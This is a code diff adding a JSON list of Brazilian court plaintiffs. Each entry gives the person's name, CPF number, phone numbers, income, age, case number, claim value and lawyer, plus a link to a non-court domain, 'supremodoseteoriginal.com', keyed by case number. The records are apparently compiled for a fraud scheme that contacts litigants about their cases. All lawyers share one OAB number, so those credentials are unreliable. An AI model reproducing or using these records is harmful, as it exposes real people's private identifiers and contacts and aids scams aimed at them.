+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA ÚNICA DA COMARCA DE VAZANTE",
+        "data_inicio": "25/02/2025",
+        "classe_processo": "Usucapião",
+        "assunto_processo": "Usucapião Extraordinária",
+        "advogado_cliente": "NATALIA ARAUJO ROMAO BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99236-9367 | (34) 99158-6643",
+        "renda": "R$ 1690,01",
+        "idade": 77,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5000388-08.2025.8.13.0710"
+    },
+    {
+        "cpf_cliente": "90205731600",
+        "nome_cliente": "MANOEL DE JESUS PEREIRA ALMEIDA",
+        "numero_processo": "5012727-78.2023.8.13.0480",
+        "valor_processo": "R$ 66.000,00",
+        "polo_passivo": "AGUIMAR HERLEI SOARES 69297355668",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "1ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "17/08/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Irregularidade no atendimento",
+        "advogado_cliente": "CARLOS AUGUSTO DE SOUZA SANTOS | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 98869-7869 | (61) 99803-6194 | (34) 99977-0464 | (34) 98849-2681",
+        "renda": "R$ 1370,58",
+        "idade": 54,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5012727-78.2023.8.13.0480"
+    },
+    {
+        "cpf_cliente": "86705951508",
+        "nome_cliente": "WILLIAN FIALHO FERNANDES",
+        "numero_processo": "5016260-45.2023.8.13.0480",
+        "valor_processo": "R$ 12.000,00",
+        "polo_passivo": "NU FINANCEIRA S.A. - SOCIEDADE DE CREDITO, FINANCIAMENTO E INVESTIMENTO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "3ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "18/10/2023",
+        "classe_processo": "Cumprimento de sentença",
+        "assunto_processo": "Inclusão Indevida em Cadastro de Inadimplentes",
+        "advogado_cliente": "NATALIA LUANA PEREIRA ARAUJO | OAB: MG202058",
+        "telefones": "📱 CEL: (74) 99925-8600 | (19) 99945-3306",
+        "renda": "R$ 0,00",
+        "idade": 25,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5016260-45.2023.8.13.0480"
+    },
+    {
+        "cpf_cliente": "84985038687",
+        "nome_cliente": "JOSE MARIA LIMA BORGES JUNIOR",
+        "numero_processo": "5087844-51.2024.8.13.0024",
+        "valor_processo": "R$ 6.955,12",
+        "polo_passivo": "CLUBE PLENA DE BENEFICIOS",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA DE PRECATÓRIAS CÍVEIS DA COMARCA DE BELO HORIZONTE",
+        "data_inicio": "11/04/2024",
+        "classe_processo": "Carta Precatória Cível",
+        "assunto_processo": "Citação",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (38) 99748-0366",
+        "renda": "R$ 927,64",
+        "idade": 53,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5087844-51.2024.8.13.0024"
+    },
+    {
+        "cpf_cliente": "82459444672",
+        "nome_cliente": "MARIA ROSARIA DIAS",
+        "numero_processo": "5000266-73.2021.8.13.0697",
+        "valor_processo": "R$ 1.000,00",
+        "polo_passivo": "LEANDRA DIAS MOREIRA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA ÚNICA DA COMARCA DE TURMALINA",
+        "data_inicio": "22/04/2021",
+        "classe_processo": "Interdição/Curatela",
+        "assunto_processo": "Nomeação",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 556,25",
+        "idade": 58,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5000266-73.2021.8.13.0697"
+    },
+    {
+        "cpf_cliente": "61884324649",
+        "nome_cliente": "GIOVANE MENDES DE OLIVEIRA",
+        "numero_processo": "1000341-05.2025.8.13.0710",
+        "valor_processo": "R$ 1.518,00",
+        "polo_passivo": "KENIA RODRIGUES CRUVINEL",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA ÚNICA DA COMARCA DE VAZANTE",
+        "data_inicio": "19/11/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Direitos da Personalidade",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99930-0230 | (34) 99810-8841 | (34) 99795-1660",
+        "renda": "R$ 2986,64",
+        "idade": 57,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1000341-05.2025.8.13.0710"
+    },
+    {
+        "cpf_cliente": "47071450862",
+        "nome_cliente": "GABRIEL MARINE PAZETTO",
+        "numero_processo": "1008638-68.2025.8.26.0506",
+        "valor_processo": "R$ 65.000,00",
+        "polo_passivo": "ESQUADRI PRIMER ESQUADRIAS DE ALUMINIO LTDA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de São Paulo",
+        "vara_comarca": "07 CIVEL DE RIBEIRAO PRETO",
+        "data_inicio": "27/02/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Rescisão do contrato e devolução do dinheiro",
+        "advogado_cliente": "BRUNA ENES AMENDOLA | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 885,66",
+        "idade": 27,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1008638-68.2025.8.26.0506"
+    },
+    {
+        "cpf_cliente": "35777301886",
+        "nome_cliente": "DANIELLE ARAUJO FREITAS DA SILVA",
+        "numero_processo": "5014358-23.2024.8.13.0480",
+        "valor_processo": "R$ 25.000,00",
+        "polo_passivo": "SUPERMERCADO BAHAMAS S/A",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "23/08/2024",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (15) 98152-0301  ☎ FIXO: (15) 4102-0147",
+        "renda": "R$ 1181,78",
+        "idade": 40,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5014358-23.2024.8.13.0480"
+    },
+    {
+        "cpf_cliente": "16244463617",
+        "nome_cliente": "TALITA LEMOS RODRIGUES",
+        "numero_processo": "6003799-31.2024.4.06.3806",
+        "valor_processo": "R$ 1.412,00",
+        "polo_passivo": "FUNDACAO EDUCACIONAL DE PATOS DE MINAS",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal Regional Federal da 6ª Região",
+        "vara_comarca": "GAB. 34 - DES. FEDERAL EVANDRO REIMÃO",
+        "data_inicio": "25/06/2025",
+        "classe_processo": "Apelação / Remessa Necessária",
+        "assunto_processo": "Graduação (Bacharelado, Licenciatura, Profissional Tecnológica)",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 0,00",
+        "idade": 25,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=6003799-31.2024.4.06.3806"
+    },
+    {
+        "cpf_cliente": "15943928626",
+        "nome_cliente": "ERIKA RIBEIRO SILVA",
+        "numero_processo": "1003445-28.2023.4.06.3806",
+        "valor_processo": "R$ 120.000,00",
+        "polo_passivo": "CAIXA ECONOMICA FEDERAL - CEF",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal Regional Federal da 6ª Região",
+        "vara_comarca": "1ª VARA CÍVEL E JEF ADJUNTO DE PATOS DE MINAS",
+        "data_inicio": "22/06/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Fies",
+        "advogado_cliente": "NATALIA LUANA PEREIRA ARAUJO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 0,00",
+        "idade": 21,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1003445-28.2023.4.06.3806"
+    },
+    {
+        "cpf_cliente": "14891147695",
+        "nome_cliente": "LEANDRO RODRIGUES DOS SANTOS",
+        "numero_processo": "5015782-71.2022.8.13.0480",
+        "valor_processo": "R$ 151.200,00",
+        "polo_passivo": "N/A",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "24/11/2022",
+        "classe_processo": "Homologação da Transação Extrajudicial",
+        "assunto_processo": "União Estável ou Concubinato",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 669,60",
+        "idade": 26,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5015782-71.2022.8.13.0480"
+    },
+    {
+        "cpf_cliente": "13555233629",
+        "nome_cliente": "NATALIA DAIENE CASTRO DE AZEVEDO",
+        "numero_processo": "6000222-79.2023.4.06.3806",
+        "valor_processo": "R$ 30.000,00",
+        "polo_passivo": "UNIAO - ADVOCACIA GERAL DA UNIAO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal Regional Federal da 6ª Região",
+        "vara_comarca": "2ª VARA CÍVEL E JEF ADJUNTO DE PATOS DE MINAS",
+        "data_inicio": "27/11/2023",
+        "classe_processo": "Procedimento do Juizado Especial Cível",
+        "assunto_processo": "Diplomas/Certificado de Conclusão do Curso",
+        "advogado_cliente": "NATALIA LUANA PEREIRA ARAUJO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99953-0678 | (34) 99959-1718 | (34) 99836-6596",
+        "renda": "R$ 476,34",
+        "idade": 29,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=6000222-79.2023.4.06.3806"
+    },
+    {
+        "cpf_cliente": "13374500650",
+        "nome_cliente": "NADIR APARECIDA GONCALVES",
+        "numero_processo": "5015057-14.2024.8.13.0480",
+        "valor_processo": "R$ 38.000,00",
+        "polo_passivo": "ITAU UNIBANCO HOLDING S.A.",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "4ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "03/09/2024",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Rescisão do contrato e devolução do dinheiro",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99683-0558",
+        "renda": "R$ 302,89",
+        "idade": 29,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5015057-14.2024.8.13.0480"
+    },
+    {
+        "cpf_cliente": "13296754601",
+        "nome_cliente": "GUILHERME LUCAS CRUZEIRO",
+        "numero_processo": "5002133-71.2022.8.13.0534",
+        "valor_processo": "R$ 27.500,00",
+        "polo_passivo": "FACEBOOK SERVICOS ONLINE DO BRASIL LTDA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA ÚNICA DA COMARCA DE PRESIDENTE OLEGÁRIO",
+        "data_inicio": "11/11/2022",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 822,38",
+        "idade": 29,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5002133-71.2022.8.13.0534"
+    },
+    {
+        "cpf_cliente": "12513958640",
+        "nome_cliente": "RONE DOS REIS CORREA",
+        "numero_processo": "1000566-88.2026.8.13.0710",
+        "valor_processo": "R$ 27.568,32",
+        "polo_passivo": "BANCO BRADESCO FINANCIAMENTOS S.A.",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "CENTRO JUDICIÁRIO DE SOLUÇÃO DE CONFLITOS E CIDADANIA",
+        "data_inicio": "25/03/2026",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Práticas Abusivas",
+        "advogado_cliente": "ISABELA LINO DE SOUSA | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99780-6486 | (34) 99826-1892",
+        "renda": "R$ 0,00",
+        "idade": 32,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1000566-88.2026.8.13.0710"
+    },
+    {
+        "cpf_cliente": "12187873684",
+        "nome_cliente": "MARAISA SILVA PEDRO",
+        "numero_processo": "5015207-29.2023.8.13.0480",
+        "valor_processo": "R$ 212.988,00",
+        "polo_passivo": "BRZ EMPREENDIMENTOS E CONSTRUCOES LTDA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "4ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "28/09/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "BRUNA ENES AMENDOLA | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99653-3868",
+        "renda": "R$ 678,19",
+        "idade": 27,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5015207-29.2023.8.13.0480"
+    },
+    {
+        "cpf_cliente": "11927862620",
+        "nome_cliente": "JOYCE CAROLINE PESSOA",
+        "numero_processo": "5000071-44.2024.8.13.0710",
+        "valor_processo": "R$ 15.565,00",
+        "polo_passivo": "RAYANE RAQUEL RIBEIRO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "TURMA RECURSAL DO GRUPO JURISDICIONAL DE PARACATU",
+        "data_inicio": "28/05/2025",
+        "classe_processo": "Recurso Inominado Cível",
+        "assunto_processo": "Indenização por Dano Material",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 791,41",
+        "idade": 31,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5000071-44.2024.8.13.0710"
+    },
+    {
+        "cpf_cliente": "11203905912",
+        "nome_cliente": "EVELLYN LIANI FERREIRA",
+        "numero_processo": "5014445-42.2025.8.13.0480",
+        "valor_processo": "R$ 12.000,00",
+        "polo_passivo": "PAYJOY TECNOLOGIA E SERVICOS FINANCEIROS LTDA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "06/08/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Cláusulas Abusivas",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "☎ FIXO: (43) 3357-1463",
+        "renda": "R$ 418,07",
+        "idade": 26,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5014445-42.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "10576349640",
+        "nome_cliente": "RODOLFO CESAR BORGES BARBOSA",
+        "numero_processo": "5012288-96.2025.8.13.0480",
+        "valor_processo": "R$ 141.980,56",
+        "polo_passivo": "MARCOS ROGERIO NOVATO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "4ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "04/07/2025",
+        "classe_processo": "Execução de Título Extrajudicial",
+        "assunto_processo": "Cheque",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 714,80",
+        "idade": 31,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5012288-96.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "09654867613",
+        "nome_cliente": "NAYARA BARBOSA DA SILVA",
+        "numero_processo": "5012891-43.2023.8.13.0480",
+        "valor_processo": "R$ 183.985,03",
+        "polo_passivo": "BRZ EMPREENDIMENTOS E CONSTRUCOES LTDA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "1ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "21/08/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Sistema Financeiro da Habitação",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99969-3379",
+        "renda": "R$ 451,02",
+        "idade": 36,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5012891-43.2023.8.13.0480"
+    },
+    {
+        "cpf_cliente": "08756377606",
+        "nome_cliente": "JOSE RODRIGUES DA SILVA FILHO",
+        "numero_processo": "5017656-86.2025.8.13.0480",
+        "valor_processo": "R$ 1.000,00",
+        "polo_passivo": "COORDENADOR DE EDUCACAO DE TRANSITO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "5ª VARA DA FAZENDA PÚBLICA E AUTARQUIAS DA COMARCA DE BELO HORIZONTE",
+        "data_inicio": "18/09/2025",
+        "classe_processo": "Mandado de Segurança Cível",
+        "assunto_processo": "CNH - Carteira Nacional de Habilitação",
+        "advogado_cliente": "NATALIA ARAUJO ROMAO BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99951-7649",
+        "renda": "R$ 469,97",
+        "idade": 34,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5017656-86.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "08627186600",
+        "nome_cliente": "LARISSA RAQUEL BORGES MONTEIRO",
+        "numero_processo": "5002668-83.2024.8.13.0710",
+        "valor_processo": "R$ 98.480,00",
+        "polo_passivo": "BALCAO EMPREENDIMENTOS EIRELI",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "VARA ÚNICA DA COMARCA DE VAZANTE",
+        "data_inicio": "23/12/2024",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Rescisão / Resolução",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99905-3806",
+        "renda": "R$ 1194,01",
+        "idade": 33,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5002668-83.2024.8.13.0710"
+    },
+    {
+        "cpf_cliente": "08493738670",
+        "nome_cliente": "JULIANA APARECIDA DE JESUS GOMES",
+        "numero_processo": "5008138-72.2025.8.13.0480",
+        "valor_processo": "R$ 1.212,00",
+        "polo_passivo": "MUNICIPIO DE SAO GONCALO DO ABAETE",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "TURMA RECURSAL DO GRUPO JURISDICIONAL DE PATOS DE MINAS",
+        "data_inicio": "18/11/2025",
+        "classe_processo": "Recurso Inominado Cível",
+        "assunto_processo": "Admissão / Permanência / Despedida",
+        "advogado_cliente": "NATALIA ARAUJO ROMAO BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (38) 99998-6782 | (38) 99741-6300",
+        "renda": "R$ 475,34",
+        "idade": 37,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5008138-72.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "08427580622",
+        "nome_cliente": "DAYANE SOARES DE OLIVEIRA",
+        "numero_processo": "5018263-80.2023.8.13.0024",
+        "valor_processo": "R$ 20.947,57",
+        "polo_passivo": "GILDELIO ANTONIO DE MOURA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "3ª UNIDADE JURISDICIONAL DO JUIZADO ESPECIAL CÍVEL DE BELO HORIZONTE - UNIDADE FRANCISCO SALES",
+        "data_inicio": "30/01/2023",
+        "classe_processo": "Procedimento do Juizado Especial Cível",
+        "assunto_processo": "Indenização por Dano Material",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99133-3107",
+        "renda": "R$ 1425,43",
+        "idade": 38,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5018263-80.2023.8.13.0024"
+    },
+    {
+        "cpf_cliente": "08424604628",
+        "nome_cliente": "DANIEL SILVA DE MOURA",
+        "numero_processo": "5014099-91.2025.8.13.0480",
+        "valor_processo": "R$ 15.000,00",
+        "polo_passivo": "BANCO BRADESCO S.A.",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "UNIDADE JURISDICIONAL ÚNICA DO JUIZADO ESPECIAL DE PATOS DE MINAS",
+        "data_inicio": "01/08/2025",
+        "classe_processo": "Procedimento do Juizado Especial Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99226-6860",
+        "renda": "R$ 3128,13",
+        "idade": 37,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5014099-91.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "07793347609",
+        "nome_cliente": "NAYARA MARYLANDY SARAIVA NOVAES",
+        "numero_processo": "5015112-62.2024.8.13.0480",
+        "valor_processo": "R$ 1.000,00",
+        "polo_passivo": "IRACEMA RITA SILVA SARAIVA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "1ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "04/09/2024",
+        "classe_processo": "Inventário",
+        "assunto_processo": "Inventário e Partilha",
+        "advogado_cliente": "IAN BERNAR SANTOS BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 1369,58",
+        "idade": 40,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5015112-62.2024.8.13.0480"
+    },
+    {
+        "cpf_cliente": "06141586643",
+        "nome_cliente": "JOSE MANOEL NUNES DE OLIVEIRA",
+        "numero_processo": "1002517-44.2023.4.06.3817",
+        "valor_processo": "R$ 1.320,00",
+        "polo_passivo": "GERENTE EXECUTIVO DA AGENCIA DA PREVIDENCIA SOCIAL DE UBERABA/MG - INSTITUTO NACIONAL DO SEGURO SOCIAL",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal Regional Federal da 6ª Região",
+        "vara_comarca": "GAB. 23 - DES. FEDERAL BOSON GAMBOGI",
+        "data_inicio": "17/01/2024",
+        "classe_processo": "Remessa Necessária Cível",
+        "assunto_processo": "Agente Agressivo - Biológico",
+        "advogado_cliente": "MATEUS FILIPE GUIMARAES BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 2528,96",
+        "idade": 45,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1002517-44.2023.4.06.3817"
+    },
+    {
+        "cpf_cliente": "04210551627",
+        "nome_cliente": "EVALDO SILVERIO DE LELES",
+        "numero_processo": "1002286-38.2025.8.13.0480",
+        "valor_processo": "R$ 92.778,25",
+        "polo_passivo": "RENNES TAVARES DA SILVA COSTA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "3ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "17/11/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Compra e Venda",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 99903-1988 | (34) 99142-5478 | (61) 98164-1152",
+        "renda": "R$ 4068,59",
+        "idade": 47,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1002286-38.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "04130149164",
+        "nome_cliente": "GUILHERME SILVA SOUZA",
+        "numero_processo": "5018275-16.2025.8.13.0480",
+        "valor_processo": "R$ 109.825,58",
+        "polo_passivo": "GILSON DE OLIVEIRA MELO",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "4ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "26/09/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Acidente de Trânsito",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 225,84",
+        "idade": 23,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5018275-16.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "02239261676",
+        "nome_cliente": "RAQUEL GONCALVES DE QUEIROZ",
+        "numero_processo": "5006256-46.2023.8.13.0480",
+        "valor_processo": "R$ 42.451,87",
+        "polo_passivo": "ROSANA APARECIDA FERREIRA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "20/04/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Material",
+        "advogado_cliente": "NATALIA LUANA PEREIRA ARAUJO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 225,84",
+        "idade": 23,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5006256-46.2023.8.13.0480"
+    },
+    {
+        "cpf_cliente": "01986125670",
+        "nome_cliente": "ALDELICE NERES DA SILVA MIRANDA",
+        "numero_processo": "1002937-70.2025.8.13.0480",
+        "valor_processo": "R$ 100.000,00",
+        "polo_passivo": "MUNICIPIO DE VARJAO DE MINAS",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "3ª VARA CÍVEL DA COMARCA DE PATOS DE MINAS",
+        "data_inicio": "28/11/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "📱 CEL: (38) 99912-3541",
+        "renda": "R$ 374,55",
+        "idade": 27,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=1002937-70.2025.8.13.0480"
+    },
+    {
+        "cpf_cliente": "01582528616",
+        "nome_cliente": "RONNIE STEFANO OLIVEIRA",
+        "numero_processo": "5004222-05.2023.8.13.0317",
+        "valor_processo": "R$ 39.238,00",
+        "polo_passivo": "UNIAO NACIONAL DOS CONSUMIDORES E PROPRIETARIOS DE VEICULOS - UNICOON",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE ITABIRA",
+        "data_inicio": "08/05/2023",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Seguro",
+        "advogado_cliente": "BRUNA ENES AMENDOLA | OAB: MG202058",
+        "telefones": "📱 CEL: (31) 98713-8952",
+        "renda": "R$ 2108,47",
+        "idade": 39,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5004222-05.2023.8.13.0317"
+    },
+    {
+        "cpf_cliente": "00626360650",
+        "nome_cliente": "JADY BARBOSA DOS SANTOS",
+        "numero_processo": "5004116-98.2025.8.13.0470",
+        "valor_processo": "R$ 762.144,00",
+        "polo_passivo": "ASSOCIACAO DE PROTECAO E ASSISTENCIA AOS CONDENADOS",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "2ª VARA CÍVEL DA COMARCA DE PARACATU",
+        "data_inicio": "28/05/2025",
+        "classe_processo": "Procedimento Comum Cível",
+        "assunto_processo": "Indenização por Dano Moral",
+        "advogado_cliente": "LAURA ALVES DE ARAUJO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 0,00",
+        "idade": 0,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5004116-98.2025.8.13.0470"
+    },
+    {
+        "cpf_cliente": "00609937669",
+        "nome_cliente": "ROSANI CONRADO DA SILVA SANTOS",
+        "numero_processo": "5002902-11.2024.8.13.0534",
+        "valor_processo": "R$ 602.539,31",
+        "polo_passivo": "CONFEDERACAO INTERESTADUAL DAS COOPERATIVAS LIGADAS AO SICREDI",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
